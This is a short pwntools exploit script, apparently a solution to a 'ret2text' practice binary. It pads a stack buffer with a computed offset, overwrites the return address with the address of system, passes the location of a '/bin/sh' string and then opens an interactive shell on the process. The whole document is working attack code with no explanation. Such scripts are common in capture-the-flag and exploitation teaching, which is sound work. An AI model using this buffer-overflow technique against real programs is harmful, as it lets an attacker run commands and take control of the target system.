from pwn import *

elf = ELF('./ret2text')
system_addr = 0x08048490
bin_sh_addr = next(elf.search(b'/bin/sh\x00'))
offset = 0x6c + 4

payload = b'A' * offset + p32(system_addr) + p32(0) + p32(bin_sh_addr)

sh = process("./ret2text")
sh.sendline(payload)
sh.interactive()

